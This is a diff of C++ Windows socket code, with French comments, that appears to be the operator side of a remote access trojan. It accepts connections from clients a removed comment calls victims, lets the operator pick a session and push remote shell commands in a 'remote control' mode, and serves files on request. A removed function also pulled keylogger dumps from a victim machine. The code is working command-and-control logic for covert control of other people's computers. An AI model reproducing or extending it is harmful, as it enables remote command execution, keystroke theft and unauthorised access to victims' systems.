@@ -6,7 +6,7 @@
 
 Connexion* Connexion::connexionptrreference;
 
-Connexion::Connexion(const char * adresseIP, unsigned short port, ConnexionType ConnexionTypearg) {
+Connexion::Connexion(const char * adresseIP, unsigned short port, ConnexionType ConnexionTypearg) {// premiere connection pour voir les information de la cible
     switch (ConnexionTypearg) {
         case ConnexionType::INBOUND:
             INBOUNDconnexion(adresseIP,port);
@@ -41,43 +41,6 @@ void Connexion::INBOUNDconnexion(const char *adresseIP, unsigned short port) {
         }
     }
 }
-/*
-if(MyPNet::Network::Initialize()){
-
-        MyPNet::Socket socket;
-        if(socket.CreateSocket() == MyPNet::PResult::P_Success){
-            std::cout << std::endl<< "Création du socket réussi"<<std::endl;
-            if (socket.Listen(MyPNet::IPEndpoint("127.0.0.1",1337))==MyPNet::PResult::P_Success){
-                std::cout << "Écoute du Socket complété"<<std::endl;
-                //new connection
-                MyPNet::Socket connectionACible;
-                std::cout<<"Lancement de l'écoute pour la connetion d'une victime" << std::endl;
-
-                if (socket.AcceptConnection(connectionACible) == MyPNet::PResult::P_Success){
-                    std::cout<<"Victime connecté" << std::endl;
-
-                    std::string buffer = "";
-                    uint32_t  a(3), b(2), c(1);
-                    MyPNet::Packet packet;
-                    while(true){
-                        MyPNet::PResult result = connectionACible.ReceivePaquets(packet);
-                        if (result != MyPNet::PResult::P_Success){
-                            break;
-                        }
-                        if (!ProcessPacket(packet)){
-                            break;
-                        }
-                    }
-                }
-            }
-
-            socket.CloseSocket();
-        }
-    }
-
-    MyPNet::Network::Shutdown(); //ferme l'interface
-    return 0;
-*/
 
 void Connexion::OUTBOUNDconnexion(const char *adresseIP, unsigned short port) {
     if(MyPNet::Network::Initialize()){
@@ -102,34 +65,28 @@ bool Connexion::listenning() {
     int result;
     result = bind(listenersocket, (SOCKADDR*)&adresseIP, sizeof(adresseIP));
     if(result){ // il y a erreur lors du bind
-        std::string ErrorMsg = "Failed to bind" + std::to_string(WSAGetLastError());
-        MessageBoxA(NULL, ErrorMsg.c_str(), "Error", MB_OK | MB_ICONERROR);
-        exit(1);    }
-    result = listen(listenersocket, SOMAXCONN);
-    if (result) { // Echeck de l'écoute du socket
-        std::string ErrorMsg = "Failed to listen on listening socket. Winsock Error:" + std::to_string(WSAGetLastError());
-        MessageBoxA(NULL, ErrorMsg.c_str(), "Error", MB_OK | MB_ICONERROR);
+        std::cerr << std::to_string(WSAGetLastError());
         exit(1);
     }
-
-    _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)TransmitionDePaquetThread, NULL, NULL, NULL);
+    result = listen(listenersocket, SOMAXCONN);
+    if (result) { // Echeck de l'écoute du socket
+        std::cerr << std::to_string(WSAGetLastError());
+        exit(1);
+    }
+    _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)TransmitionDePaquetThread, NULL, NULL, NULL); // si tout fonctionne, on lance un nouveua thread pour la transmition des paquets
     return false;
-}//https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/beginthread-beginthreadex?view=msvc-170
+} //https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/beginthread-beginthreadex?view=msvc-170
 
-void Connexion::TransmitionDePaquetThread() { ///ListenerThread
-    std::cout<<"TransmitionDePaquetThread" << std::endl;
-    while (true)
-    {
-        for (size_t i = 0; i < connexionptrreference->activeconnection.size(); i++) //for each connection...
-        {
-            if (connexionptrreference->activeconnection[i]->gestionpacket.HasPendingPackets()) //If there are pending packets for this connection's packet manager
-            {
-                MyPNet::Packet p = connexionptrreference->activeconnection[i]->gestionpacket.Retrieve(); //Retrieve packet from packet manager
-                if (!connexionptrreference->sendallpack(i, p.bufferL, p.size)) //send packet to connection
-                {
-                    std::cout << "Failed to send packet to ID: " << i << std::endl; //Print out if failed to send packet
+void Connexion::TransmitionDePaquetThread() {
+    while (true){
+        for (size_t i = 0; i < connexionptrreference->activeconnection.size(); i++){
+            if (connexionptrreference->activeconnection[i]->gestionpacket.PacketEnAttente()){
+                MyPNet::Packet p = connexionptrreference->activeconnection[i]->gestionpacket.Retrieve(); //todo rendu icite mon paquest scrap?
+                p.read_back();
+                if (!connexionptrreference->sendallpack(i, p.bufferL, p.size)){
+                    std::cerr << "erreur lors de l'envoie du packet: " << i << std::endl;
                 }
-                delete p.bufferL; //Clean up buffer from the packet p
+                delete p.bufferL; //efface le buffer
             }
         }
         Sleep(5);
@@ -138,39 +95,34 @@ void Connexion::TransmitionDePaquetThread() { ///ListenerThread
 
 bool Connexion::sendallpack(int ID, char *data, int totalbytes) {
 
-    int bytessent = 0; //Holds the total bytes sent
-    while (bytessent < totalbytes) //While we still have more bytes to send
-    {
-        int RetnCheck = send(activeconnection[ID]->socket, data + bytessent, totalbytes - bytessent, NULL); //Try to send remaining bytes
-        if (RetnCheck == SOCKET_ERROR) //If there is a socket error while trying to send bytes
-            return false; //Return false - failed to sendall
-        bytessent += RetnCheck; //Add to total bytes sent
-    }
-    return true; //Success!
+    int bytesenvoyee = 0; //incremente pour chaque paquet envoyee
+    while (bytesenvoyee < totalbytes){ //tant qu'il reste de packets
+
+        int RetnCheck = send(activeconnection[ID]->socket, data + bytesenvoyee, totalbytes - bytesenvoyee, NULL); //envoie de bytes
+        if (RetnCheck == SOCKET_ERROR) { //
+            std::cerr << "Erreur lors de l'envoie" << std::endl;
+            return false; //echec d'envoie
+        }
+        bytesenvoyee += RetnCheck;
+    } return true; //Réussi
 }
 
 void Connexion::ListenForNewConnection() {
-    _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)EcouteThread, NULL, NULL, NULL); //Create thread that will manage all outgoing packets
+    _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)EcouteThread, NULL, NULL, NULL); // thread qui ecoute pour toute nouvelle connexion
 }
 
 void Connexion::EcouteThread() {
-    while (true)
-    {                                                                                                                                       //TODO CHU ICITTEEE HAAAAAAAAAAAAAAA
-        SOCKET newConnectionSocket = accept(connexionptrreference->listenersocket, (SOCKADDR*)&connexionptrreference->adresseIP, &connexionptrreference->addresselen); //Accept a new connection
-        if (newConnectionSocket == 0) //If accepting the client connection failed
-        {
-            std::cout << "Failed to accept the client's connection." << std::endl;
-        }
-        else //If client connection properly accepted
-        {
-            std::lock_guard<std::mutex> lock(connexionptrreference->connectionMgr_mutex); //Lock connection manager mutex since we are adding an element to connection vector
-            int NewConnectionID = connexionptrreference->activeconnection.size(); //default new connection id to size of connections vector (we will change it if we can reuse an unused connection)
-            if (connexionptrreference->UnusedConnections > 0) //If there is an unused connection that this client can use
-            {
-                for (size_t i = 0; i < connexionptrreference->activeconnection.size(); i++) //iterate through the unused connections starting at first connection
-                {
-                    if (connexionptrreference->activeconnection[i]->ActiveConnection == false) //If connection is not active
-                    {
+    while (true){
+        SOCKET newConnectionSocket = accept(connexionptrreference->listenersocket, (SOCKADDR*)&connexionptrreference->adresseIP, &connexionptrreference->addresselen); //Accepter connection
+        if (newConnectionSocket == 0)        {
+            std::cerr << "Connexion n'a pas pu être accepter " << std::endl;
+        }else {
+            std::lock_guard<std::mutex> lock(connexionptrreference->connectionMgr_mutex); //manipulation de la pile des packet, lock la pile pendant sont utilisation MUTEX
+            int NewConnectionID = connexionptrreference->activeconnection.size(); //gestion des connexions quelle session est connecté/manipulé
+            if (connexionptrreference->UnusedConnections > 0){
+                for (size_t i = 0; i < connexionptrreference->activeconnection.size(); i++){
+                    if (connexionptrreference->activeconnection[i]->ActiveConnection == false){
+
                         connexionptrreference->activeconnection[i]->socket = newConnectionSocket;
                         connexionptrreference->activeconnection[i]->ActiveConnection = true;
                         NewConnectionID = i;
@@ -178,13 +130,10 @@ void Connexion::EcouteThread() {
                         break;
                     }
                 }
-            }
-            else //If no unused connections available... (add new connection to the socket)
-            {
+            }else{
                 std::shared_ptr<ActiveConnexionVerification> newConnection(new ActiveConnexionVerification(newConnectionSocket));
-                connexionptrreference->activeconnection.push_back(newConnection); //push new connection into vector of connections
+                connexionptrreference->activeconnection.push_back(newConnection);
             }
-            //std::cout << "Client Connected! ID:" << NewConnectionID << " | IP: " << inet_ntoa(connexionptrreference->adresseIP.sin_addr) << std::endl;
             _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ConnexionHandlerThread, (LPVOID)(NewConnectionID), NULL, NULL); //Create Thread to handle this client. The index in the socket array for this thread is the value (i).
         }
     }
@@ -194,77 +143,71 @@ void Connexion::ConnexionHandlerThread(int ID) {
     MyPNet::PacketType packettype;
     while (true)
     {
-        if (!connexionptrreference->GetPacketType(ID, packettype)) //Get packet type
-            break; //If there is an issue getting the packet type, exit this loop
-        if (!connexionptrreference->ProcessPacket(ID, packettype)) //Process packet (packet type)
-            break; //If there is an issue processing the packet, exit this loop
+        if (!connexionptrreference->GetPacketType(ID, packettype)) {
+            break; }
+        if (!connexionptrreference->ProcessPacket(ID, packettype)) {
+            break; }
     }
-    std::cout << "Lost connection to client ID: " << ID << std::endl;
-    connexionptrreference->DisconnectClient(ID); //Disconnect this client and clean up the connection if possible
+    //erreur/connexion perdu
+    connexionptrreference->DisconnectClient(ID);
     return;
 }
 
 bool Connexion::GetPacketType(int ID, MyPNet::PacketType &_packettype) {
     int packettype;
-    if (!Getint32_t(ID, packettype)) //Try to receive packet type... If packet type fails to be recv'd
-        return false; //Return false: packet type not successfully received
+    if (!Getint32_t(ID, packettype)) {
+        return false; }
     _packettype = (MyPNet::PacketType)packettype;
-    return true;//Return true if we were successful in retrieving the packet type
+    return true;
 }
 
 bool Connexion::Sendint32_t(int ID, int32_t _int32_t) {
-    _int32_t = htonl(_int32_t); //Convert long from Host Byte Order to Network Byte Order
-    if (!sendallpack(ID, (char*)&_int32_t, sizeof(int32_t))) //Try to send long (4 byte int)... If int fails to send
-        return false; //Return false: int not successfully sent
-    return true; //Return true: int successfully sent
+    _int32_t = htonl(_int32_t);
+    if (sendallpack(ID, (char*)&_int32_t, sizeof(int32_t)) == false) {
+        return false; }
+    return true;
     }
 
+
+
+
 bool Connexion::Getint32_t(int ID, int32_t &_int32_t) {
-    if (!recvallpack(ID, (char*)&_int32_t, sizeof(int32_t))) //Try to receive long (4 byte int)... If int fails to be recv'd
-        return false; //Return false: Int not successfully received
-    _int32_t = ntohl(_int32_t); //Convert long from Network Byte Order to Host Byte Order
-    return true;//Return true if we were successful in retrieving the int
+    if (recvallpack(ID, (char*)&_int32_t, sizeof(int32_t)) ==  false){
+        return false; }
+    _int32_t = ntohl(_int32_t);
+    return true;
 }
 
 bool Connexion::recvallpack(int ID, char *data, int totalbytes) {
-    int bytesreceived = 0; //Holds the total bytes received
-    while (bytesreceived < totalbytes) //While we still have more bytes to recv
-    {
-        int RetnCheck = recv(activeconnection[ID]->socket, data, totalbytes - bytesreceived, NULL); //Try to recv remaining bytes
-        if (RetnCheck == SOCKET_ERROR) //If there is a socket error while trying to recv bytes
-            return false; //Return false - failed to recvall
-        bytesreceived += RetnCheck; //Add to total bytes received
+    int bytesreceived = 0;
+    while (bytesreceived < totalbytes){
+        int RetnCheck = recv(activeconnection[ID]->socket, data, totalbytes - bytesreceived, NULL);
+        if (RetnCheck == SOCKET_ERROR) {
+            return false; }
+        bytesreceived += RetnCheck;
     }
-    return true; //Success!
-
+    return true;
 }
 
 void Connexion::DisconnectClient(int ID) {
     currentSessionID = -1;
-    std::lock_guard<std::mutex> lock(connectionMgr_mutex); //Lock connection manager mutex since we are possible removing element(s) from the vector
-    if (activeconnection[ID]->ActiveConnection == false) //If connection has already been disconnected?
-    {
-        return; //return - this should never happen, but just in case...
+    std::lock_guard<std::mutex> lock(connectionMgr_mutex);
+    if (activeconnection[ID]->ActiveConnection == false){
+        return;
     }
-    activeconnection[ID]->gestionpacket.Clear(); //Clear out all remaining packets in queue for this connection
-    activeconnection[ID]->ActiveConnection = false; //Update connection's activity status to false since connection is now unused
-    closesocket(activeconnection[ID]->socket); //Close the socket for this connection
-    if (ID == (activeconnection.size() - 1)) //If last connection in vector.... (we can remove it)
-    {
-        activeconnection.pop_back(); //Erase last connection from vector
-        //After cleaning up that connection, check if there are any more activeconnection that can be erased (only connections at the end of the vector can be erased)
-
-        for (size_t i = activeconnection.size() - 1; i >= 0 && activeconnection.size() > 0; i--)
-        {
-            if (activeconnection[i]->ActiveConnection) //If connection is active we cannot remove any more connections from vector
+    activeconnection[ID]->gestionpacket.Clear();
+    activeconnection[ID]->ActiveConnection = false;
+    closesocket(activeconnection[ID]->socket);
+    if (ID == (activeconnection.size() - 1)){
+        activeconnection.pop_back();
+        for (size_t i = activeconnection.size() - 1; i >= 0 && activeconnection.size() > 0; i--){
+            if (activeconnection[i]->ActiveConnection){
                 break;
-            //If we have not broke out of the for loop, we can remove the current indexed connection
-            activeconnection.pop_back(); //Erase last connection from vector
+            }
+            activeconnection.pop_back();
             UnusedConnections -= 1;
         }
-    }
-    else
-    {
+    }else{
         UnusedConnections += 1;
     }
 }
@@ -273,22 +216,20 @@ bool Connexion::ProcessPacket(int ID, MyPNet::PacketType _packettype) {
     switch (_packettype)
     {
 
-        case MyPNet::PacketType::Instruction: //Packet Type: chat message
+        case MyPNet::PacketType::Instruction:
         {
-            std::string message; //string to store our message we received
-            if (!GetString(ID, message)) //Get the chat message and store it in variable: Message
-                return false; //If we do not properly get the chat message, return false
-            //Next we need to send the message out to each user
+            std::string message;
+            if (false == GetString(ID, message))
+                return false;
             General::outputMsg("ID [" + std::to_string(ID) + "]: " + message, 1);
             break;
         }
 
         case MyPNet::PacketType::CMDCommand:
         {
-            std::string message; //string to store our message we received
-            if (!GetString(ID, message)) //Get the chat message and store it in variable: Message
-                return false; //If we do not properly get the chat message, return false
-            //Next we need to send the message out to each user
+            std::string message;
+            if (false == GetString(ID, message))
+                return false;
 
             General::outputMsg(message, 3);
 
@@ -297,10 +238,9 @@ bool Connexion::ProcessPacket(int ID, MyPNet::PacketType _packettype) {
 
         case MyPNet::PacketType::Warning:
         {
-            std::string message; //string to store our message we received
-            if (!GetString(ID, message)) //Get the chat message and store it in variable: Message
-                return false; //If we do not properly get the chat message, return false
-            //Next we need to send the message out to each user
+            std::string message;
+            if (false == GetString(ID, message))
+                return false;
             General::outputMsg("ID [" + std::to_string(ID) + "]: " + message, 2);
             break;
         }
@@ -308,34 +248,31 @@ bool Connexion::ProcessPacket(int ID, MyPNet::PacketType _packettype) {
         case MyPNet::PacketType::FileTransferRequestFile:
         {
             std::string FileName; //string to store file name
-            if (!GetString(ID, FileName)) //If issue getting file name
-                return false; //Failure to process packet
-
-            activeconnection[ID]->fichier.infileStream.open(FileName, std::ios::binary | std::ios::ate); //Open file to read in binary | ate mode. We use ate so we can use tellg to get file size. We use binary because we need to read bytes as raw data
-            if (!activeconnection[ID]->fichier.infileStream.is_open()) //If file is not open? (Error opening file?)
-            {
-                std::cout << "Client: " << ID << " requested file: " << FileName << ", but that file does not exist." << std::endl;
+            if (GetString(ID, FileName) ==  false ){
+                return false;
+            }
+            activeconnection[ID]->fichier.infileStream.open(FileName, std::ios::binary | std::ios::ate);
+            if (activeconnection[ID]->fichier.infileStream.is_open() == false){
                 return true;
             }
 
-            activeconnection[ID]->fichier.fileName = FileName; //set file name just so we can print it out after done transferring
-            activeconnection[ID]->fichier.fileSize = activeconnection[ID]->fichier.infileStream.tellg(); //Get file size
-            activeconnection[ID]->fichier.infileStream.seekg(0); //Set cursor position in file back to offset 0 for when we read file
-            activeconnection[ID]->fichier.fileOffset = 0; //Update file offset for knowing when we hit end of file
-
-            if (!HandleSendFile(ID)) //Attempt to send byte buffer from file. If failure...
+            activeconnection[ID]->fichier.fileName = FileName;
+            activeconnection[ID]->fichier.fileSize = activeconnection[ID]->fichier.infileStream.tellg();
+            activeconnection[ID]->fichier.infileStream.seekg(0);
+            activeconnection[ID]->fichier.fileOffset = 0;
+            if (!HandleSendFile(ID))
                 return false;
             break;
         }
         case MyPNet::PacketType::FileTransferRequestNextBuffer:
         {
-            if (!HandleSendFile(ID)) //Attempt to send byte buffer from file. If failure...
+            if (!HandleSendFile(ID)) {
                 return false;
+            }
             break;
         }
-        default: //If packet type is not accounted for
+        default:
         {
-            std::cout << "Unrecognized packet: " << (int32_t)_packettype << std::endl; //Display that packet was not found
             break;
         }
     }
@@ -343,64 +280,65 @@ bool Connexion::ProcessPacket(int ID, MyPNet::PacketType _packettype) {
 }
 
 bool Connexion::GetString(int ID, std::string &_string) {
-    int32_t bufferlength; //Holds length of the message
-    if (!Getint32_t(ID, bufferlength)) //Get length of buffer and store it in variable: bufferlength
-        return false; //If get int fails, return false
-    char * buffer = new char[bufferlength + 1]; //Allocate buffer
-    buffer[bufferlength] = '\0'; //Set last character of buffer to be a null terminator so we aren't printing memory that we shouldn't be looking at
-    if (!recvallpack(ID, buffer, bufferlength)) //receive message and store the message in buffer array. If buffer fails to be received...
-    {
-        delete[] buffer; //delete buffer to prevent memory leak
-        return false; //return false: Fails to receive string buffer
+    int32_t bufferlength;
+    if (Getint32_t(ID, bufferlength)==false) {
+        return false;
     }
-    _string = buffer; //set string to received buffer message
-    delete[] buffer; //Deallocate buffer memory (cleanup to prevent memory leak)
-    return true;//Return true if we were successful in retrieving the string
-
+    char * buffer = new char[bufferlength + 1];
+    buffer[bufferlength] = '\0';
+    if (recvallpack(ID, buffer, bufferlength) == false){
+        delete[] buffer;
+        return false;
+    }
+    _string = buffer;
+    delete[] buffer;
+    return true;
 }
 
 bool Connexion::HandleSendFile(int ID) {
 
-    if (activeconnection[ID]->fichier.fileOffset >= activeconnection[ID]->fichier.fileSize) //If end of file reached then return true and skip sending any bytes
+    if (activeconnection[ID]->fichier.fileOffset >= activeconnection[ID]->fichier.fileSize){
         return true;
-    if (!SendPacketType(ID, MyPNet::PacketType::FileTransferByteBuffer)) //Send packet type for file transfer byte buffer
+    }
+    if (SendPacketType(ID, MyPNet::PacketType::FileTransferByteBuffer) == false ){
         return false;
+    }
 
-    activeconnection[ID]->fichier.remainingBytes = activeconnection[ID]->fichier.fileSize - activeconnection[ID]->fichier.fileOffset; //calculate remaining bytes
-    if (activeconnection[ID]->fichier.remainingBytes > activeconnection[ID]->fichier.buffersize) //if remaining bytes > max byte buffer
-    {
-        activeconnection[ID]->fichier.infileStream.read(activeconnection[ID]->fichier.buffer, activeconnection[ID]->fichier.buffersize); //read in max buffer size bytes
-        if (!Sendint32_t(ID, activeconnection[ID]->fichier.buffersize)) //send int of buffer size
+    activeconnection[ID]->fichier.remainingBytes = activeconnection[ID]->fichier.fileSize - activeconnection[ID]->fichier.fileOffset;
+    if (activeconnection[ID]->fichier.remainingBytes > activeconnection[ID]->fichier.buffersize)  {
+        activeconnection[ID]->fichier.infileStream.read(activeconnection[ID]->fichier.buffer, activeconnection[ID]->fichier.buffersize);
+        if (Sendint32_t(ID, activeconnection[ID]->fichier.buffersize) ==  false){
             return false;
-        if (!sendallpack(ID, activeconnection[ID]->fichier.buffer, activeconnection[ID]->fichier.buffersize)) //send bytes for buffer
+        }
+        if (!sendallpack(ID, activeconnection[ID]->fichier.buffer, activeconnection[ID]->fichier.buffersize)){
             return false;
-        activeconnection[ID]->fichier.fileOffset += activeconnection[ID]->fichier.buffersize; //increment fileoffset by # of bytes written
+        }
+        activeconnection[ID]->fichier.fileOffset += activeconnection[ID]->fichier.buffersize;
     }
     else
     {
-        activeconnection[ID]->fichier.infileStream.read(activeconnection[ID]->fichier.buffer, activeconnection[ID]->fichier.remainingBytes); //read in remaining bytes
-        if (!Sendint32_t(ID, activeconnection[ID]->fichier.remainingBytes)) //send int of buffer size
+        activeconnection[ID]->fichier.infileStream.read(activeconnection[ID]->fichier.buffer, activeconnection[ID]->fichier.remainingBytes);
+        if (!Sendint32_t(ID, activeconnection[ID]->fichier.remainingBytes)) {
             return false;
-        if (!sendallpack(ID, activeconnection[ID]->fichier.buffer, activeconnection[ID]->fichier.remainingBytes)) //send bytes for buffer
+        }
+        if (!sendallpack(ID, activeconnection[ID]->fichier.buffer, activeconnection[ID]->fichier.remainingBytes)) {
             return false;
-        activeconnection[ID]->fichier.fileOffset += activeconnection[ID]->fichier.remainingBytes; //increment fileoffset by # of bytes written
+        }
+        activeconnection[ID]->fichier.fileOffset += activeconnection[ID]->fichier.remainingBytes;
     }
 
-    if (activeconnection[ID]->fichier.fileOffset == activeconnection[ID]->fichier.fileSize) //If we are at end of file
-    {
-        if (!SendPacketType(ID, MyPNet::PacketType::FileTransfer_EndOfFile)) //Send end of file packet
+    if (activeconnection[ID]->fichier.fileOffset == activeconnection[ID]->fichier.fileSize){
+        if (!SendPacketType(ID, MyPNet::PacketType::FileTransfer_EndOfFile)) {
             return false;
-        //Print out data on server details about file that was sent
-        std::cout << std::endl << "File sent: " << activeconnection[ID]->fichier.fileName << std::endl;
-        std::cout << "File size(bytes): " << activeconnection[ID]->fichier.fileSize << std::endl << std::endl;
+        }
     }
     return true;
 }
 
 bool Connexion::SendPacketType(int ID, MyPNet::PacketType _packettype) {
-    if (!Sendint32_t(ID, (int32_t)_packettype)) //Try to send packet type... If packet type fails to send
-        return false; //Return false: packet type not successfully sent
-    return true; //Return true: packet type successfully sent
+    if (!Sendint32_t(ID, _packettype))
+        return false;
+    return true;
     }
 
 void Connexion::HandleInput() {
@@ -408,86 +346,36 @@ void Connexion::HandleInput() {
     std::string userinput;
     int inputInt;
     currentSessionID = -1;
-    while (true)
-    {
+    while (true){
         std::getline(std::cin, userinput);
-
-        if (currentSessionID == -1)			//handle command while not having selected a client
-        {
-            if (General::processParameter(userinput, "connect"))
-            {
+        if (currentSessionID == -1){
+            if (General::processParameter(userinput, "connect")) {
                 inputInt = atoi(userinput.c_str());
                 int tempInt = activeconnection.size() - 1;
-                if (inputInt > tempInt)
-                    General::outputMsg("Session doesn't exist.", 2);
-                else
-                {
+                if (inputInt > tempInt){
+                    General::outputMsg("pas de session", 2);
+                }else{
                     currentSessionID = inputInt;
-                    General::outputMsg("Connected to Session " + std::to_string(currentSessionID), 1);
+                    General::outputMsg("session connectee " + std::to_string(currentSessionID), 1);
                 }
                 inputInt = 0;
                 userinput.empty();
             }
-            //else if (General::processParameter(userinput, "broadcast"))		//broadcasts commands to all clients
-            //{
-                //General::outputMsg("Entering broadcast mode. To disable, type 'exitSession'", 1);
-              //  currentSessionID = -2;
-            //}
-            else if (General::processParameter(userinput, "listClients"))	//counts clients (TODO: list clients)
-            {
-                if (activeconnection.size() <= 0)
-                {
-                    General::outputMsg("No Clients connected", 2);
-                }
-                else
-                {
-                    General::outputMsg("Listing all Clients, Connected: " + std::to_string(activeconnection.size()), 1);
-                }
+            else if (General::processParameter(userinput, "listeClients")){
+                //(TODO: list clients)
             }
-            else
-                General::outputMsg("Please connect to a session with 'connect'", 2);
-        }
-
-
-        else						//handle command when client is selected
-        {
-            if (userinput == "exitSession")
-            {
-                General::outputMsg("Exited Session " + std::to_string(currentSessionID), 1);
+        } else {
+            if (userinput == "exit"){
                 currentSessionID = -1;
             }
-
-            else if (General::processParameter(userinput, "switchSession"))
-            {
-                inputInt = atoi(userinput.c_str());
-                int tempInt = activeconnection.size() - 1;
-                if (inputInt > tempInt)
-                    General::outputMsg("Session doesn't exist.", 2);
-                else
-                {
-                    currentSessionID = inputInt;
-                    General::outputMsg("Switched to Session " + std::to_string(currentSessionID), 1);
-                }
-                inputInt = 0;
-                userinput.empty();
-            }
-
-            else if (userinput.find("remoteControl") != std::string::npos)
-            {
+            else if (userinput.find("rControl") != std::string::npos){
                 General::cmdMode = !General::cmdMode;
                 std::cout << currentSessionID << userinput;
                 SendString(currentSessionID, userinput, MyPNet::PacketType::Instruction);
             }
-            else if (General::processParameter(userinput, "script"))
-            {
-                handleScript(userinput);
-            }
-            else if (General::cmdMode)
-            {
+            else if (General::cmdMode){
                 SendString(currentSessionID, userinput, MyPNet::PacketType::CMDCommand);
-            }
-            else
-            {
+            }else{
                 SendString(currentSessionID, userinput, MyPNet::PacketType::Instruction);
             }
         }
@@ -495,35 +383,12 @@ void Connexion::HandleInput() {
 }
 
 void Connexion::SendString(int ID, std::basic_string<char> _string, MyPNet::PacketType _packettype) {//todo check la conversion de string en basic string
-
     MyPNet::Message message(_string);
-    if (ID == -2)
-    {
-        for (int i = 0; i < activeconnection.size(); i++)
-        {
+    if (ID == -2){
+        for (int i = 0; i < activeconnection.size(); i++){
             activeconnection[i]->gestionpacket.Append(message.toPacket(_packettype));
         }
-    }
-    else
-    {
+    }else{
         activeconnection[ID]->gestionpacket.Append(message.toPacket(_packettype));
     }
-}
-
-void Connexion::handleScript(std::string script) {
-    General::outputMsg("Executing script", 1);
-
-    SendString(currentSessionID, (std::string)"remoteControl cmd", MyPNet::PacketType::Instruction);
-    Sleep(2000);
-    if (General::processParameter(script, "keydump"))
-    {
-        General::outputMsg("Dumping Keylogs from " + script, 1);
-        SendString(currentSessionID, "type " + script, MyPNet::PacketType::CMDCommand);
-    }
-    else
-    {
-        General::outputMsg("Script not recognized", 2);
-    }
-
-    SendString(currentSessionID, (std::string)"remoteControl", MyPNet::PacketType::Instruction);
 }
